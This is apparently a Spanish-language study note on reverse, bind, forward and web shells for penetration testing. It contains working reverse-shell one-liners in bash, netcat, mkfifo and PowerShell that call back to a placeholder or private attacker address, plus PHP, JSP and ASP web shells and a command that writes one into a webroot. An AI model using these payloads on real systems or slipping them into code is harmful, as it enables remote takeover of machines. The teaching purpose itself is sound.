---

---
-----
- Tags: #linux #shell 
---------
## Definición

> Una **shell** es un programa informático que permite al usuario ejecutar comandos para interactuar con el sistema operativo, entre las shells más conocidas tenemos bash y zsh. En este documento se explica el concepto y funcionamiento básico de los shells, además de un ejemplo práctico de su funcionamiento.

## Tipos de shell

Principalmente se utilizan 2 tipos de shell: **reverse shell** y **bind shell**, aunque también existen las **forward shell**. Esta última es útil si nos encontramos frente a un firewall que necesitamos evadir, y buscamos la forma de tener una TTY interactiva. Veamos las diferencias de los shells TCP.

##### 1. Reverse Shell

Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndole tomar el control de la máquina remota.

En este caso, es el servidor web quien se conecta a la maquina del atacante (antes referenciada como cliente). Para ello, lo que hacemos es levantar un servicio en la maquina del atacante, en un puerto de escucha. Luego el servidor web se conecta a esta pasándole como referencia la shell del mismo servidor.

![[reverse_shell1.png]]

Los atacantes que realizan una reverse shell, muchas veces hacen uso de los servicios de VPS, en donde pueden tener direcciones IP publicas y configurar las 
reglas del gateway, para poder establecer la conexión entrante de la víctima y así poder ejecutar comandos en el sistema operativo. Las reverse shell con [[Netcat]] se pueden crear de la siguiente forma:

1. Por un lado, usamos [[Netcat]] para ponernos en modo escucha con un puerto, de esta manera: 
``` bash
nc -nlvp 4444
```

| Flag    | Descripción                                                                                   |
| ------- | --------------------------------------------------------------------------------------------- |
| -l      | Modo escucha, para esperar que se conecte una conexión entrante.                              |
| -v      | Modo verboso, para que se muestre información detallada cuando se reciba una conexión.        |
| -n      | Deshabilita la resolución DNS y se conecta únicamente por IP, acelerando la conexión.         |
| -p 4444 | Número de puerto en el que netcat está escuchando, al que se debe enviar la conexión inversa. |

2. Enviamos la revershe shell al equipo por dicho puerto: 
``` bash 
ncat -e /bin/bash <IP_victima> 4444
```

Otra forma de hacerlo es con la one liner:

```bash
bash -c "bash -i >& /dev/tcp/MI_IP/4444 0>&1"
```

Si no nos traga la URL el carácter `&`, lo sustituimos con `%26`.

![[reverse_shell2.png]]

Como podemos ver en la imagen, es la máquina del servidor web quien se conecta a la máquina del atacante entablando una conexión y permitiendo que sea el atacante quien ejecute comandos en la máquina del servidor web. 

En el siguiente enlace podemos ver múltiples reverse shell: [Reverse Shell Cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), o en este otro [Github](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#rust)

Existen múltiples formas de realizar una reverse shell. Ya hemos visto el oneliner básico con bash, aunque podemos utilizar `mkfifo`, en este ejemplo:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

O en powershell:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

##### 2. Bind Shell

Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.

 El usuario el cual proporciona la shell, espera una conexión en un puerto en específico. Cuando un cliente se conecta a este puerto, se entabla una comunicación, en la cual todo lo que envía el usuario se considera un comando que se inserta en la shell del usuario.

![[bind_shell1.png | center]]

Para realizar una bind shell se siguen los siguientes pasos:

1. En la máquina víctima (del usuario), se configura la shell de escucha (bind shell):
``` bash
nc -lvp PORT -e /bin/bash
```

2. En la máquina del atacante (cliente), establecer una conexión al puerto de escucha:
``` bash
nc <IP_victima> PORT
```

![[bind_shell2.png]]

Este tipo de shell es viable en una red local, ya que no existe una restricción de que puerto se pueden usar y cuales están cerrados por defecto. Ahora, en el caso de que se comuniquen dos computadores en redes distintas, existe un gran problema puesto que se debería abrir el puerto de la conexión en el Gateway, para que un cliente externo pueda conectarse a la máquina del usuario y entablar la conexión.

- **Ejemplo de un bind shell completo**:

Aquí
##### 3. Forward Shell

Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.

### 4. Web Shell

Es un script web, como PHP o ASPX que acepta nuestro comando a través de parámetros de solicitudes HTTP como GET o POST, ejecuta nuestro comando e imprime la salida de vuelta en la página web. 

Lo primero de todo es escribir el web shell correspondiente a través de una solicitud GET, ejecutarlo e imprimir el resultado de vuelta. Normalmente es un one-liner muy corto que podemos memorizar fácilmente. Aquí tenemos varios ejemplos en PHP, JSP y ASP:

En PHP (el más común):

```php
<?php system($_REQUEST["cmd"]); ?>
```

En JSP:

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

En ASP:

```asp
<% eval request("cmd") %>
```

Una vez que tenemos nuestra web shell, necesitamos colocar el script de la web shell en el directorio web (webroot) del host remoto para ejecutar el script a través del navegador. Esto puede realizarse mediante una vulnerabilidad en una función de carga (upload), lo que nos permitiría escribir una de nuestras shells en un archivo, por ejemplo, `shell.php`, subirlo y luego acceder al archivo subido para ejecutar comandos.

Sin embargo, si solo contamos con ejecución remota de comandos a través de un exploit, podemos escribir nuestra shell directamente en el webroot para acceder a ella vía web. Por lo tanto, el primer paso es identificar dónde se encuentra el webroot. A continuación, se muestran los webroots predeterminados para algunos servidores web comunes:

| Servidor Web | Webroot Predeterminado       |
|--------------|------------------------------|
| Apache       | `/var/www/html/`             |
| Nginx        | `/usr/local/nginx/html/`     |
| IIS          | `c:\inetpub\wwwroot\`         |
| XAMPP        | `C:\xampp\htdocs\`           |

Podemos comprobar estos directorios para ver cuál webroot se está utilizando y, a continuación, usar `echo` para escribir nuestra web shell. Por ejemplo, si estamos atacando un host Linux que ejecuta Apache, podemos escribir una shell PHP con el siguiente comando:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

Finalmente, debemos acceder al web shell, podemos hacerlo por el navegador (url) o usando `curl`. 

```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

### Tener una TTY funcional

Cuando logremos realizar una shell (sea del tipo que sea), no tendremos una terminal funcional completa (no podremos hacer `Ctrl+L`, dar al tabulador, etc...), podemos conseguirlo siguiendo estos pasos:
1. Realizamos la shell correspondiente
2. `script /dev/null -c bash` 
3. Presionamos `Ctrl+Z`
4. `stty raw -echo; fg`
5. En este momento, puede que no se vea lo que estamos escribiendo. Si esto sucede, escribimos `reset xterm`
6. `export xterm`
7. `export TERM=xterm`
8. `export SHELL=bash`
9. `stty rows <ROWS> columns <COLUMNS>`. Los valores de rows y columns los obtenemos escribiendo `stty size` en nuestro terminal